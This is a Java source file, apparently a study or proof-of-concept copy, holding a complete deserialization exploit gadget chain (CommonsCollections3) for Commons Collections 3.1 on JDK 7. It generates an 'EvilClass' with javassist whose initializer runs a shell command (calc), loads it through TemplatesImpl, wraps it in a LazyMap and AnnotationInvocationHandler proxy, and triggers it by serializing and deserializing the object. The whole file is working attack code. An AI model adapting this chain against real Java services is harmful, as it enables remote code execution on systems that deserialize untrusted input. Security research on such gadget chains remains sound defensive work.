import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;

import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class CC3 { // jdk 7, commons-collections:3.1
    public static void main(String[] args) {
        try {
            ClassPool cp = ClassPool.getDefault();
            cp.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass evilClass = cp.makeClass("EvilClass");
            evilClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));

            evilClass.makeClassInitializer().insertBefore("Runtime.getRuntime().exec(\"calc\");");
            byte[] byteCodes = evilClass.toBytecode();

            TemplatesImpl tpl = new TemplatesImpl();

            setFieldValue(tpl, "_bytecodes", new byte[][] {byteCodes});
            setFieldValue(tpl, "_name", "hacker");
            setFieldValue(tpl, "_tfactory", new TransformerFactoryImpl());

            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(
                            new Class[] {Templates.class},
                            new Object[] { tpl }
                    )
            };

            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            Map lmap = LazyMap.decorate(new HashMap(), chainedTransformer);

            Constructor aihCtor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler")
                    .getDeclaredConstructors()[0];
            aihCtor.setAccessible(true);
            InvocationHandler ih = (InvocationHandler) aihCtor.newInstance(Override.class, lmap);
//            setFinalField(ih, "memberValues", lmap);

//            System.out.println(getFinalField(ih, "memberValues"));

            Map proxyMap = Map.class.cast(Proxy.newProxyInstance(lmap.getClass().getClassLoader(), lmap.getClass().getInterfaces(), ih));
            InvocationHandler ih_2 = (InvocationHandler) aihCtor.newInstance(Override.class, proxyMap);

            ByteArrayOutputStream serializedData = serialize(ih_2);
            deserialize(serializedData);


        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static ByteArrayOutputStream serialize(Object object) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(object);
            return baos;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    static void deserialize(ByteArrayOutputStream baos)  {

        try {
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void deserializeFromFile(String filename) throws IOException, ClassNotFoundException {
        try {
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
            ois.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    static void setFinalField(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class
                    .getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers()
                    & ~Modifier.FINAL);

            field.set(obj, value);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }

    static Object getFinalField(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);

            Field modifiersField = Field.class
                    .getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers()
                    & ~Modifier.FINAL);

            return field.get(obj);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        return null;
    }

    static Object getFieldValue(Object obj, String name) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            return field.get(obj);

        } catch (Exception e) {
            System.out.println(e);
            return e;
        }

    }

    static void setFieldValue(Object obj, String name, Object value) {
        try {
            Field field = obj.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(obj, value);

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
